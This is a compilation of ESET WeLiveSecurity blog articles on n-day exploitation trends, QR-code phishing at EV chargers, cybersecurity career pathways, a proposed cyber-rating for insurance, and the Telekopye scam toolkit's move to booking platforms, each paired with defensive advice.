The rest of the software flaws under review were exploited as n-days; i.e., vulnerabilities first exploited after patches are made available (versus zero days, which are abused before patches are released). The average time to exploit a software flaw has been shrinking considerably over the years &ndash; from 63 days in 2018-2019 all the way to only five days last year.</p> <p>These and other figures in the report underscore a disconcerting trend: threat actors are rapidly getting better at spotting and weaponizing software vulnerabilities, which clearly poses an escalating threat to businesses and individuals alike.</p> <p>What else did the report find and how does the market for zero-day exploits factor into the problem?

                <p><b>Ever alert to fresh money-making opportunities, fraudsters are blending physical and digital threats to steal drivers’ payment details</b></p>     <p>Many countries and regions across the world have been moving quickly on electric cars in recent years. <a href="https://www.iea.org/reports/global-ev-outlook-2024/trends-in-electric-cars">Around 14 million new cars</a> were registered in 2023 alone, a 35% annual increase which brings the worldwide total to over 40 million. But with new technology comes new threats. Ever alert to fresh money-making opportunities, criminal groups are blending physical and virtual-world threats to steal drivers&rsquo; <a href="https://www.welivesecurity.com/2022/06/27/5-ways-cybercriminals-steal-credit-card-details/">payment details</a>.</p> <p>One of their latest tricks, spotted in several countries in Europe, is to use QR code phishing techniques known as &ldquo;quishing&rdquo; to eavesdrop on or steal payment details. In fact, it&rsquo;s not at all dissimilar from tricks that leverage <a href="https://www.welivesecurity.com/2022/02/04/think-before-scan-how-fraudsters-exploit-qr-codes/">fake QR codes on parking meters</a>, and EV drivers need to watch out for this kind of threat at charging stations.</p> <h2>What&rsquo;s quishing and how does it work?</h2> <p>Phishing is one of the most popular and effective techniques for cybercriminals to achieve their goals. It&rsquo;s often a precursor to all kinds of cyberthreats, revolving around theft of your personal information and log-ins, or <a href="https://www.welivesecurity.com/2020/12/23/7-ways-malware-can-get-your-device/">covert installation of malware</a>. Why does it work so well? Because it relies on our propensity to believe what we are told by people or organizations in positions of authority.</p> <p>There are so many variations of phishing that it can be difficult for police, corporate security teams and government agencies to keep their public awareness exercises up to date. Quishing is a good example. Although QR codes have been around since the 90s, quishing as a threat really started to appear during the pandemic. That&rsquo;s because QR codes became a familiar sight up and down the high street, as a more hygienic way to access everything from menus to medical forms.</p> <div> <blockquote> <p><em>RELATED READING: <a href="https://www.welivesecurity.com/2020/11/30/mobile-payment-apps-how-stay-safe-paying-phone/">Mobile payment apps: How to stay safe when paying with your phone</a></em></p> </blockquote> </div> <p>Fraudsters leapt into action, sticking fake QR codes over the real ones. When scanned, they take victims to a phishing site to harvest their credentials/information or download malware. It&rsquo;s a particularly effective tactic because it doesn&rsquo;t arouse the same level of suspicion among users as, say, phishing URLs. Mobile devices are also typically less well protected than laptops and desktops, so there&rsquo;s more chance of success. A report from late last <a href="https://www.infosecurity-magazine.com/news/quishing-campaigns-spike-50-in/">year noted</a> a 51% increase in quishing incidents in September versus January-August 2023.</p> <div><blockquote class="twitter-tweet"><a href="https://twitter.com/lozzylozboz/status/1845542609281818925" target="_blank"></a></blockquote> <&zwnj;script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script></div> <h2>Why are EVs at risk?</h2> <p>Ever-resourceful criminal actors have now spotted a way to adapt the scam to the new EV craze sweeping Europe. According to reports from the <a href="https://fleetworld.co.uk/fake-qr-codes-being-used-in-parking-and-charging-payment-scams/">UK</a>, <a href="https://www.connexionfrance.com/news/warning-over-qr-code-scam-with-electric-car-charging-in-france/628478">France</a> and <a href="https://www.yahoo.com/news/electric-car-owners-being-targeted-111433451.html">Germany</a>, fraudsters are sticking malicious QR codes on top of legitimate ones on public charging stations. The code is meant to take users to a website where they can pay the station operator (e.g., Ubitricity) for their electricity.</p> <p>However, if they scan the bogus code, they&rsquo;ll be taken to a lookalike phishing site that prompts them to enter their payment details, which are then harvested by the malicious actors. It&rsquo;s claimed that the correct site will load at the second attempt, to ensure victims can eventually pay for their charging. It&rsquo;s also claimed in <a href="https://www.auto-motor-und-sport.de/tech-zukunft/alternative-antriebe/quishing-betrugs-gefahr-an-der-ladesaeule-v1/">some reports</a> that bad actors may even be using signal jamming technology, to prevent victims from using their charging apps and forcing them to scan the malicious QR code.</p> <p>With over 600,000 EV charging points <a href="https://autovista24.autovistagroup.com/news/what-is-current-state-europe-ev-charging-infrastructure/">across Europe</a>, there&rsquo;s plenty of opportunities for scammers to catch drivers unawares with such scams. They take advantage of the fact that many EV owners may be new to the experience, and more inclined to scan the code rather than trying to download the official charging/payment app or call the helpline. With various vendors supplying these stations, the scammers may also be looking to capitalize on user fatigue. A QR code is often a quicker and more attractive option than taking the time to download multiple charging apps.</p> <p><a href="https://www.theguardian.com/money/article/2024/aug/15/uk-motorists-warned-of-fake-parking-qr-codes-being-used-in-quishing-scams">There have been a number of reports</a> about scammers targeting motorists via malicious QR codes stuck to parking meters. In this case, the unwitting motorist may not only lose their card details &ndash; they might also be hit by a parking fine from the local council.</p> <figure class="image"><img style="width: 70%; margin: 0 auto; display: block;" title="" src="https://web-assets.esetstatic.com/wls/2024/10-2024/qr-code-phishing.png" alt="qr code phishing" width="" height="" /> <figcaption><em>Warning about fake QR codes on parking signs and meters in Southampton, UK.

Fortunately, there are some simple steps you can take to mitigate the risk of quishing while you&rsquo;re out and about:</p> <ul> <li>Look closely at the QR code. Does it appear as if stuck over the top of something else, or is it part of the original sign? Is it a different color or font to the rest of the sign, or does it look out of place in any other way? These could be red flags.</li> <li>Never scan a QR code unless it&rsquo;s displayed on the charging/parking meter terminal itself.</li> <li>Consider only paying via a phone call or the official charging app of the relevant operator.</li> <li>Consider disabling the option to perform automatic actions when scanning a QR code, such as visiting a website or downloading a file. After scanning, look at the URL to check that it&rsquo;s a legitimate domain associated with the service, rather than a suspicious URL.</li> <li>Does the website the QR code takes you to feature any grammatical or spelling mistakes or there&rsquo;s something else that feels off about it? If so, it may be a phishing site.</li> <li>If something doesn&rsquo;t look right, call the charging operator direct.</li> <li>Many parking meters, for example, offer multiple ways to pay, such as credit card, <a href="https://www.welivesecurity.com/en/cybersecurity/to-tap-or-not-to-tap-are-nfc-payments-safer/">NFC payments</a> or coins. If you&rsquo;re uncomfortable scanning a QR code, consider using one of these alternatives to avoid the risk of interacting with a fraudulent code.</li> <li>If you think you may have been scammed, freeze your payment card and report potential fraud to your bank/card provider.</li> <li>Check your bank statement for any suspicious transactions, if you are concerned you may have been a victim of quishing.</li> <li>Use two-factor authentication (2FA) on all accounts that offer for an extra layer of security. This helps protect your account even if a scammer manages to redirect you to a fraudulent website and steal your credentials.</li> <li>Ensure your mobile device has security software installed from a reputable provider.</li> </ul> <p>News of the latest QR quishing campaign will only increase calls for codes to be banned from public places. But in the meantime, it pays to be cautious.</p>

What&rsquo;s more, successful attacks on providers of critical services such as <a href="https://www.upguard.com/blog/biggest-data-breaches-in-healthcare" target="_blank" rel="noopener">healthcare</a> and <a href="https://www.welivesecurity.com/2022/06/13/industroyer-cyber-weapon-brought-down-power-grid/" target="_blank" rel="noopener">energy supplies</a> can cause large-scale disruptions, putting people&rsquo;s lives at risk and leading to widespread chaos.</p> <p>Worryingly, the global demand for security professionals continues to outpace supply. In fact, according to <a href="https://www.theregister.com/2024/09/11/mind_the_talent_gap_infosec/" target="_blank" rel="noopener">fresh data by non-profit ISC2</a>, the workforce gap is widening further, with the number of security job openings now standing at a whopping 4.8 million. It&rsquo;s little wonder that many security professionals, both rank-and-file and <a href="https://www.welivesecurity.com/en/business-security/buck-stops-stakes-high-cisos/" target="_blank" rel="noopener">leaders</a>, are <a href="https://www.welivesecurity.com/2022/08/15/black-hat-2022-burnout-significant-issue/" target="_blank" rel="noopener">facing burnout</a>. The talent crunch has been a stubborn challenge for many years, so much so that it has prompted also governments to <a href="https://www.whitehouse.gov/oncd/briefing-room/2024/09/04/service-for-america-cyber-is-serving-your-country/">roll out initiatives</a> aimed at <a href="https://www.welivesecurity.com/2020/03/03/5-reasons-consider-career-cybersecurity/" target="_blank" rel="noopener">encouraging careers in security</a>.</p> <p>Meanwhile, much ink has been spilled on the revolutionary potential of AI, including its role in countering escalating threats and even helping bridge the security skills gap. Although obviously <a href="https://www.welivesecurity.com/en/cybersecurity/beyond-buzz-understanding-ai-role-cybersecurity/" target="_blank" rel="noopener">AI does have a role to play in cybersecurity</a>, human expertise won&rsquo;t become obsolete any time soon. Indeed, the demand for skilled security professionals who can design, deploy, and manage solutions safeguarding our digital worlds has never been greater.</p> <p>We&rsquo;ve previously asked ESET&rsquo;s very own security researchers for their thoughts on <a href="https://www.welivesecurity.com/2021/10/21/cybersecurity-careers-what-know-how-get-started/">why and how to break into security</a>, the <a href="https://www.welivesecurity.com/2019/11/14/getting-into-cybersecurity-selftaught-university/" target="_blank" rel="noopener">value of formal versus self-education</a>, and even <a href="https://www.welivesecurity.com/2021/11/03/whats-it-like-work-malware-researcher-10-questions-answered/" target="_blank" rel="noopener">what working as a security researcher is actually like</a>. In this blog, we&rsquo;ll explore cybersecurity internships, scholarships and apprenticeships as three great pathways, especially for young people, to jump-start their careers in this exciting and rewarding field.</p> <h2>Cybersecurity internships</h2> <p>Internships offer a front-row seat to the &ldquo;action&rdquo;, providing practical, real-world exposure alongside seasoned professionals. You get a crash course in the actual challenges of cybersecurity, possibly gaining real-time insights into areas of expertise such as threat detection, incident response and vulnerability assessment.</p> <p>Depending on the organization and your actual intern position, you can acquire technical skills, hone problem-solving abilities, and learn to collaborate in dynamic environments &ndash; all of will serve you well down the road.</p> <p>As well as individual development, you can build your professional network, connect with industry experts and receive mentorship. These relationships can come in handy when planning the next steps of your development and career path.</p> <p>Internships not only benefit individuals, but participating organizations, too. By nurturing talent early, internships contribute to filling the cybersecurity workforce gap and can bring fresh perspectives and innovative ideas to traditional and outdated processes.</p> <p>Although internships are typically unpaid, several major players, including <a href="https://www.cisa.gov/careers/work-rolescyber-and-it-interns" target="_blank" rel="noopener">CISA</a>, <a href="https://www.gov.uk/guidance/dcdc-internship-programme" target="_blank" rel="noopener">DoD</a>, <a href="https://www.dhs.gov/homeland-security-careers/icdf" target="_blank" rel="noopener">DHS</a> and <a href="https://www.ibm.com/uk-en/careers/internships" target="_blank" rel="noopener">IBM</a>, offer paid opportunities, ensuring that students at all stages of their cyber journey can get a foot in the door without undue financial stress.</p> <h2>Cybersecurity scholarships</h2> <p>Cybersecurity scholarships are financial awards designed to support students pursuing education and careers in this field. The financial awards typically cover tuition fees, books, or any necessary hardware, thus significantly reducing the financial burden of higher education and making it more accessible to those who wouldn&rsquo;t have been able to afford it otherwise.</p> <p>You can apply for cybersecurity scholarships from various places including colleges, non-profit organizations and well-known companies, and they cater to undergraduate, graduate and certification program students. For example, ESET currently runs Women in Cybersecurity scholarships for female undergraduates looking to pursue a career in cybersecurity in the <a href="https://www.eset.com/uk/women-in-cybersecurity-scholarship/">UK</a><u>,</u><a href="https://www.eset.com/us/women-in-cybersecurity-scholarship/">US</a>, <a href="https://www.eset.com/ca/women-in-cybersecurity-scholarship/">Canada</a> and <a href="https://www.eset.com/blog/company/womens-day-esets-women-in-cybersecurity-scholarship/">Australia</a>. This initiative aims to support gender diversity in STEM, a traditionally male-dominated industry.</p> <p>Generally speaking, eligibility criteria vary. For example, you may be required to work at the sponsoring organization after studying or you may only apply if your household income is below a certain threshold. It&rsquo;s worth researching the different scholarships available to see where you might be the best fit.</p> <p>When applying, you may also need to write a thoughtful proposal on why you are suitable for the scholarship. This should include a background into your passion for the subject, any related experience you have, and how you intend to make the most out of your scholarship/course.</p> <h2>Cybersecurity apprenticeships</h2> <p>Cybersecurity apprenticeships are structured training programs that combine on-the-job learning with classroom and theory work. Funded by the government, an organization, or a mix of both, they provide a valuable opportunity for young people to train and gain skills in cybersecurity while receiving a wage.</p> <p>Apprenticeships can vary in where they lie in your cybersecurity career. Some can start from age 16, straight after GCSEs or a high school diploma. Others might start from 18 or are open to any age with the right attitude and experience.</p> <p>As apprenticeships come in different levels, you can work your way up from level 2 to level 7, becoming more skilled (and potentially better paid) with each progression. Some cybersecurity apprenticeships prepare you for industry certifications that validate the training and expertise learned, enhancing employability further down the line.</p> <h2>Is cybersecurity a good career?</h2> <p>Now, if the above still hasn&rsquo;t convinced you to join the ranks of security professionals, here are a few extra things that could do the trick. Cybersecurity is considered a great career for many reasons, including:</p> <ul> <li>High demand: As threats and technologies evolve, cybersecurity professionals are in high demand across all industries.</li> <li>Job security: Almost all industries require cybersecurity, including health, government, education, law, financial services, and manufacturing &ndash; cybersecurity roles aren&rsquo;t going anywhere.</li> <li>Competitive salaries: Cybersecurity offers competitive salaries with multiple routes for progression and development.</li> <li>Future-proof potential: As technology advances, the need for cybersecurity will only grow. By choosing this field as a career, you will be at the forefront of digital innovation.</li> </ul> <p>Internships, scholarships and apprenticeships are only some of the ways to start or accelerate a career in security. With a constant new stream of threats and tactics to discover, no two days are the same. In addition, cybersecurity opens up a wide range of opportunities for all. With so many ways to get into the industry, we can help create a new generation of security professionals to help keep our digital lives safe.</p>

                <p><b>Could human risk in cybersecurity be managed with a cyber-rating, much like credit scores help assess people’s financial responsibility?</b></p>     <p>It&rsquo;s undeniable that cyber insurance and cybersecurity are intrinsically linked. One requires the other, and they are a perfect pairing, even if they may deny the relationship. Looking ahead, however, we probably need to add a third party into the relationship: the business. Now we have everyone in the room, what could the future hold?</p> <p>There are obvious areas of evolution in the relationship. Insurers want to know that cybersecurity is not just turning up for work, but that it is also doing a good job. It&rsquo;s likely that insurers will want to see this good job in action, in near real-time, and in some instances possibly in real-time.</p> <p>For example, if an insurer requires endpoint detection and response (EDR), they don&rsquo;t mean &ldquo;install it and forget about it&rdquo; until next year&rsquo;s insurance renewal. They want to know that the system is operational and that alerts are being responded to promptly. We can already see this oversight requirement as some insurers are heading down a path of providing an element of managed services or requiring regular reports from EDR systems. However, this provision of service via the insurer may be causing a monoculture environment of security products, where all the insured are protected by a single product &ndash; something I advise against.</p> <p>Where might this go long-term? What might insurers see as another method of reducing risk that ultimately removes the need for them to pay out on a claim? After all, their goal is to minimize payouts and maintain profitability.</p> <p>Humans pose a significant risk in cybersecurity terms. They can be socially engineered, make mistakes, take shortcuts, and, unfortunately, their behavior is difficult to change. As insurers look to protect their profits and reduce claims, how can they solve the issue of the human risk?</p> <p>This challenge is not dissimilar from the one faced by the finance industry, which attempts to reduce the financial risk of loaning money to humans who make bad decisions, don&rsquo;t make payments, or are, maybe, a little reckless with their cash. A significant part of the answer in the finance industry is credit ratings: each human is awarded a dynamic score that changes as behavior patterns change, and financial organizations can adjust their risk in near real-time. This is a data-based decision made possible by using advanced AI technology and because data about our financial transactions is shared, at least in part.</p> <div> <blockquote> <p><em>This blog is the final of a series looking into cyber insurance and its relevance in this increasingly digital era &ndash; see also parts&nbsp;<a href="https://www.welivesecurity.com/en/business-security/cyber-insurance-part-cyber-threat-mitigation-strategy/">1</a>,&nbsp;<a href="https://www.welivesecurity.com/en/business-security/cyberthreat-drives-businesses-cyber-risk-insurance/">2</a>,&nbsp;<a href="https://www.welivesecurity.com/en/business-security/why-tech-savvy-leadership-key-cyber-insurance-readiness/">3</a>,&nbsp;<a href="https://www.welivesecurity.com/en/business-security/how-regulatory-standards-and-cyber-insurance-inform-each-other/">4</a>, <a href="https://www.welivesecurity.com/en/business-security/the-key-considerations-for-cyber-insurance-a-pragmatic-approach/">5</a> and <a href="https://www.welivesecurity.com/en/business-security/understanding-cyber-incident-disclosure/">6</a>.

In other words, could we see the development of a &ldquo;cyber-rating&rdquo;, similar to the credit rating used in finance?</p> <p>In some countries and regions, a potential employer may reject an applicant based on their credit rating, at least for roles where financial responsibility is required, and there may come a day where a cyber-rating is used in the same way.</p> <p>Now imagine a scenario where every internet user has such a rating based not on the detail of their transactions or communications, but on some specific elements of their online interactions and patterns of behavior. With enough information, a data-based prediction could be made on whether a person will click a phishing link, attach unencrypted data to an email, or engage in questionable browsing habits. As with credit ratings, everybody could view their cyber rating, and take advice on how to improve it, just as we do with credit ratings today.</p> <p>Employers could use this metric to ensure they are offering a position to a cyber-responsible individual who will not put the company at risk. Insurers may require their clients not to employ anyone below a certain score, or to put limitations on those with lower scores, thus reducing the insurer&rsquo;s risk exposure.</p> <p>Some employers already monitor employee online behavior and identify those that pose a risk, so that they can then reinforce cybersecurity awareness and policy to reduce the risk. This is controversial, though, as it may infringe privacy and employment law. On the other hand, a potential employee may be willing to waive these rights if it means securing a job, in the same way they may consent to the employer running a credit rating check.</p> <p>A cyber-rating could have other uses, and even strengthen the credit rating system. Online fraud and scams often require the victim to have taken actions online; if the probability of someone clicking on that unbelievable offer or a scam email were known due to the cyber-rating, then a bank may place additional authentication requirements for that person when transacting online. The two ratings could potentially complement each other.</p> <p>On the other hand, obviously the security surrounding cyber-ratings would need to be very stringent. If these risk scores were to fall into the wrong hands, cybercriminals could weaponize them to identify the people who are most susceptible to phishing and other attacks. This could effectively turn the system into a tool for targeting vulnerable individuals, undermining its purposes in enhancing cybersecurity measures and risk management.</p> <p>There are many ways cyber insurance could evolve over time, but the ability to remove or reduce the human risk would be the next big win beyond imposing the current cybersecurity requirements that insurers insist on today.</p> <p>Business transformation and hybrid working with AI: How should organizations respond to the growing cyber risk?</p> <p><em>Listen to journalist Peter Warren&rsquo;s conversations with Prof. Leslie Wilcox, Professor at London School of Economics, about the problem with digitalization, and the importance of balancing cost-efficiency and cyber resilience.&nbsp;</em></p> <div><&zwnj;iframe title="" src="https://www.buzzsprout.com/1068769/15231435-business-transformation-and-hybrid-working-with-ai-how-should-organisations-respond-to-the-growing-cyber-risk?client_source=small_player&amp;iframe=true&amp;referrer=https://www.buzzsprout.com/1068769/15231435-business-transformation-and-hybrid-working-with-ai-how-should-organisations-respond-to-the-growing-cyber-risk.js%3Fcontainer_id%3Dbuzzsprout-player-15231914%26player%3Dsmall" width="100%" height="200" frameborder="0" scrolling="no" loading="lazy"></iframe> <blockquote> <p><em>Learn more about how cyber risk insurance, combined with advanced cybersecurity solutions, can improve your chance of survival if, or when, a cyberattack occurs.

                <p><b>ESET Research shares new findings about Telekopye, a scam toolkit used to defraud people on online marketplaces, and newly on accommodation booking platforms</b></p>     <p>The growing popularity of online marketplaces has attracted fraudsters preying on unsuspecting buyers and sellers, looking to score payment card information rather than to strike a bargain. ESET researchers have found that one such organized scammer network &ndash; which uses Telekopye, a toolkit discovered by ESET Research in 2023 &ndash; has expanded its operations to target users of popular accommodation booking platforms.</p> <p>Last year, we published a two-part blogpost series on Telekopye, a Telegram-based toolkit cybercriminals use to scam people on online marketplaces. The <a href="https://www.welivesecurity.com/en/eset-research/telekopye-hunting-mammoths-using-telegram-bot/" target="_blank" rel="noopener">first part</a> focused on Telekopye&rsquo;s key features, while the <a href="https://www.welivesecurity.com/en/eset-research/telekopye-chamber-neanderthals-secrets/" target="_blank" rel="noopener">second part</a> examined the inner workings of the affiliated scam groups. In this blogpost, we follow up on what has changed in Telekopye operations since our last publication, based on our continued tracking. We look into how these scammer groups have branched out to targeting Booking.com and Airbnb, as well as their various other efforts to optimize their operations and maximize financial gain. Last but not least, we provide guidance on how to stay protected from these scams.</p> <p>We presented our updated findings on Telekopye at the <a href="https://www.virusbulletin.com/conference/vb2024/abstracts/marketplace-scams-neanderthals-hunting-mammoths-telekopye/" target="_blank" rel="noopener">Virus Bulletin conference</a> on October 2<sup>nd</sup>, 2024, and in our white paper, which you can read in full <a href="https://web-assets.esetstatic.com/wls/en/papers/white-papers/marketplace-scams.pdf" target="_blank" rel="noopener">here</a>.

It is used by dozens of scam groups, with up to thousands of members, to steal millions from Mammoths, as they call the targeted buyers and sellers. Neanderthals, as we call the scammers, require little to no technical knowledge &ndash; Telekopye takes care of everything in a matter of seconds.</p> <p>Discovered by ESET Research in 2023, Telekopye has been in use since at least 2016, with victims all over the world. Multiple leads point to Russia as the country of origin of the bot&rsquo;s author(s) and also the scammers using it. Telekopye is designed to target a large variety of online services in Europe and North America, such as OLX, Vinted, eBay, Wallapop, and others. At the time of writing, we have counted approximately 90 different services being targeted by the scams.</p> <p>Neanderthals &ndash; members of any Telegram group utilizing Telekopye &ndash; gain access to the bot&rsquo;s UI, which enables simple generation of phishing emails, SMS messages, web pages, and other features.</p> <p>Telekopye groups have a business-like operation, with a clear hierarchy, defined roles, internal practices &ndash; including admission and mentoring processes for newcomers &ndash; fixed working hours, and commission payouts for Telekopye administrators. The Workers performing the scams must turn over any sensitive information stolen, and do not actually steal any money &ndash; that is managed by other roles in the organization. Each group keeps a transparent chat of all transactions, visible to all members.</p> <p>Neanderthals utilize two main scenarios for targeting online marketplaces &ndash; one where they pose as sellers and another, much more common, where they pose as buyers. Both scenarios end with the victim/Mammoth entering payment card information or online banking credentials into a phishing web page mimicking a payment gateway.</p> <p>Recently, Telekopye groups have expanded their targeting by adding support for scamming users of popular online platforms for booking accommodation, which we cover in the following section.</p> <h2>Branching out to accommodation booking platforms</h2> <p>In 2024, Telekopye groups have expanded their scamming playbook with schemes targeting users of popular online platforms for hotel and apartment reservations, such as Booking.com and Airbnb. They have also increased the sophistication of their victim selection and targeting.</p> <h3>Targeting with a twist</h3> <p>In this new scam scenario, Neanderthals contact a targeted user of one of these platforms, claiming that there is an issue with the user&rsquo;s booking payment. The message contains a link to a well-crafted, legitimate-looking web page mimicking the abused platform.</p> <p>The page contains prefilled information about a booking, such as the check-in and checkout dates, price, and location. This comes with a troubling twist: the info provided on the fraudulent pages matches <em>real bookings</em> made by the targeted users.</p> <p>The Neanderthals achieve this by utilizing compromised accounts of legitimate hotels and accommodation providers on the platforms, which they most likely access via stolen credentials purchased on cybercriminal forums. Using their access to these accounts, scammers single out users who recently booked a stay and haven&rsquo;t paid yet &ndash; or paid very recently &ndash; and contact them via in-platform chat. Depending on the platform and the Mammoth&rsquo;s settings, this leads to the Mammoth receiving an email or SMS from the booking platform.</p> <p>This makes the scam much harder to spot, as the information provided is personally relevant to the victims, arrives via the expected communication channel, and the linked, fake websites look as expected. The only visible sign of something being amiss are the websites&rsquo; URLs, which do not match those of the impersonated, legitimate websites. Neanderthals may also use their own email addresses for the initial communication (rather than the compromised accounts), in which case the emails might be more easily recognized as malicious.</p> <p>Once the target fills out the form on the phishing page (Figure 1), they are brought to the final step of the &ldquo;booking&rdquo; &ndash; a form requesting payment card information (Figure 2). As in the marketplace scams, card details entered into the form are harvested by the Neanderthals and used to steal money from the Mammoth&rsquo;s card.</p> <figure class="image"><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/telekopye/figure-1.png" alt="" width="1846" height="1225" /> <figcaption><em>Figure 1. Example of a fake Booking.com form created by Telekopye</em></figcaption> </figure> <figure class="image align-center"><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/telekopye/figure-2.png" alt="" width="1841" height="1245" /> <figcaption><em>Figure 2. Example of a fake Booking.com payment form created by Telekopye</em></figcaption> </figure> <p>According to ESET telemetry, this type of scam started gaining traction in 2024. As seen in Figure 3, the accommodation-themed scams saw a sharp uptick in July, surpassing the original Telekopye marketplace scams for the first time, with more than double the detections during that month. In August and September, the detection levels for the two categories evened out.</p> <p>As this increase coincides with the summer holiday season in the targeted regions &ndash; prime time for taking advantage of people booking stays &ndash; it remains to be seen whether this trend will continue. Looking at the overall 2024 data, we can see that these newer scams have amassed approximately half of the detection numbers of the marketplace variants. This is noteworthy considering that the newer scams focus on two platforms only, compared to the wide variety of online marketplaces targeted by Telekopye.</p> <figure class="image"><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/telekopye/figure-3.png" alt="" width="1028" height="586" /> <figcaption><em>Figure 3. Types of online services targeted by Telekopye in 2024, seven-day moving average detection trend</em></figcaption> </figure> <h2>Advanced Telekopye features</h2> <p>Besides diversifying their target portfolio, Neanderthals have also improved their tools and operations to increase their financial returns.</p> <p>Throughout our tracking of Telekopye, we&rsquo;ve observed that different Telegram groups implement their own advanced features into the toolkit, aimed at speeding up the scam process, improving communication with targets, protecting phishing websites against disruption by competitors, and other goals.</p> <h3>Automated phishing page generation</h3> <p>To speed up the process of creating scam materials for posing as buyers on marketplaces, Neanderthals implemented web scrapers for popular targeted platforms. With these, only the URL to the product is required, instead of having to manually fill out a questionnaire about the targeted Mammoth and product in question. Telekopye parses the web page and extracts all necessary information automatically, providing a significant speedup for the scammers.</p> <h3>Interactive chatbot with on-the-fly translation</h3> <p>Neanderthals maintain a large collection of predefined answers to questions commonly asked by Mammoths. These are translated into various languages and kept as part of internal documentation, with the translations perfected over the years.</p> <p>Neanderthals typically use these predefined phrases to try to direct the Mammoth to the phishing website, which comes with a chatbot in the lower right corner. Any message the Mammoth enters into the chat is forwarded to the Neanderthal&rsquo;s Telegram chat, where it is automatically translated. Automatic translation of Neanderthals&rsquo; messages is not supported &ndash; Neanderthals translate their messages manually, usually using <a href="https://www.deepl.com/en/translator" target="_blank" rel="noopener">DeepL</a>. Figure 3 shows how such an interaction looks from the Neanderthal&rsquo;s and Mammoth&rsquo;s points of view.</p> <figure class="image"><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/telekopye/figure-4.png" alt="" width="1127" height="795" /> <figcaption><em>Figure 4. Chatbot example from Neanderthal&rsquo;s (left) and Mammoth&rsquo;s (right) points of view. Neanderthal messages were machine translated from Russian to English.</em></figcaption> </figure> <h3>Anti-DDoS measures</h3> <p>The vast majority of the phishing websites are serviced by Cloudflare, relying on that service&rsquo;s added protection, mainly against crawlers and automatic analysis. Interestingly, some of the Telekopye phishing websites also come with DDoS protection included. According to the Neanderthals&rsquo; knowledge base, which we obtained by infiltrating their ranks, this feature aims to protect against attacks by rival groups. These are sometimes launched as a means to disrupt a competitor&rsquo;s operations for a short period.</p> <h2>Law enforcement operations</h2> <p>In late 2023, after ESET Research had published its two-part series on Telekopye, Czech and Ukrainian police <a href="https://www.policie.cz/clanek/tiskova-zprava-k-operacim-rip-a-victory.aspx">arrested</a> tens of cybercriminals utilizing Telekopye, including the key players, in two joint operations. Both operations were aimed against an unspecified number of Telekopye groups, which had accumulated at least &euro;5 million (approximately US$5.5 million) since 2021, based on police estimates.</p> <p>Besides the obvious success in disrupting such criminal activities, the arrests provided new insights into the groups&rsquo; workings, most notably recruitment and employment practices. The groups in question were managed, from dedicated workspaces, by middle-aged men from Eastern Europe and West and Central Asia. They recruited people in difficult life situations, through job portal postings promising &ldquo;easy money&rdquo;, as well as by targeting technically skilled foreign students at universities.</p> <p>Some perpetrators confessed that they also participated in another scam group, similar to the Telekopye ones, that utilized call centers. The police learned that the recruits in that operation were often stripped of their passports and personal IDs to make quitting very difficult. Further, the managers sometimes went so far as to threaten the staff and their family members. This chilling development puts these operations into a completely different light.</p> <h2>Recommendations</h2> <p>The best way to stay protected against scams driven by Telekopye is being aware of Neanderthals&rsquo; tactics and exercising caution on the affected platforms. Besides knowing what red flags to pay attention to, we strongly recommend using a reputable antimalware solution on your device to step in if you do end up being lured to a phishing website.</p> <h3>Online marketplace scams</h3> <ul> <li>Always verify the person you are talking with, mainly their history on the platform, age of their account, rating, and location &ndash; a location too far away, a fresh account with no history, or a bad rating might be indicators of a scammer.</li> <li>With the improvements in machine translation, messages from a scammer might not raise any red flags in terms of grammar. Rather than focusing on the language, focus on the conversation itself &ndash; overly eager or assertive communication should raise some concerns.</li> <li>Keep the communication on the platform, even if the person you&rsquo;re talking to suggests otherwise. Their unwillingness to stay on the platform should be a major red flag.</li> <li>If you are a buyer, use secure interfaces within the platform throughout the whole buying process, whenever available. Otherwise, insist on in-person exchange of goods and money, or arrange for your choice of reliable delivery services with the option to pay on delivery.</li> <li>If you are a seller, use secure interfaces within the platform throughout the whole selling process, whenever available. Otherwise, manage delivery options yourself and don&rsquo;t agree to those offered by the buyer.</li> <li>If you get to a point where you do visit a link sent by the person you are talking to, be sure to carefully check the URL, content, and certificate properties of the website before engaging with it.</li> </ul> <h3>Accommodation booking scams</h3> <ul> <li>Before filling out any forms related to your booking, always make sure you haven&rsquo;t left the official website or app of the platform in question. Being directed to an external URL to proceed with your booking and payment is an indicator of a possible scam.</li> <li>Because this scam uses compromised accounts of accommodation providers, contacting the providers directly is not a reliable way of verifying the legitimacy of payment requests. When in doubt, contact the official customer support of the platform (<a href="https://secure.booking.com/help" target="_blank" rel="noopener">Booking.com</a>, <a href="https://www.airbnb.com/help" target="_blank" rel="noopener">Airbnb</a>) or report a security issue (<a href="https://partner.booking.com/en-us/help/legal-security/security/report-security-issue" target="_blank" rel="noopener">Booking.com</a>, <a href="https://www.airbnb.com/report-phishing" target="_blank" rel="noopener">Airbnb</a>).</li> <li>To protect your account from compromise, whether you&rsquo;re booking accommodation or renting one out, use a strong password and enable two-factor authentication wherever available.</li> </ul> <h2>Conclusion</h2> <p>Our research into Telekopye activities has given us unique insights into these scams: we were able to understand the technical means behind the scope of the operations, the business side of Telekopye groups, and even learn about Neanderthals themselves.</p> <p>We have described the groups&rsquo; various efforts to maximize their financial gains, including expanding their victim pool, taking advantage of seasonal opportunities, and improving their tools and operations. Most notably, we have detailed the Neanderthals&rsquo; newest approach of targeting accommodation booking platforms, which also comes with more sophisticated targeting.</p> <p>It is worth noting that we have communicated with several platforms targeted by Telekopye throughout our research; they are fully aware of these scams and confirmed they have employed several tactics to combat them. However, caution is still advised for users due to the number of the scams and their continuous evolution.</p> <blockquote> <div><em>For any inquiries about our research published on WeLiveSecurity, please contact us at <a style="background-color: #f4f4f4;" href="mailto:threatintel@eset.com?utm_source=welivesecurity.com&amp;utm_medium=referral&amp;utm_campaign=autotagging&amp;utm_content=eset-research&amp;utm_term=en">threatintel@eset.com</a>.&nbsp;</em></div> <div><em>ESET Research offers private APT intelligence reports and data feeds.

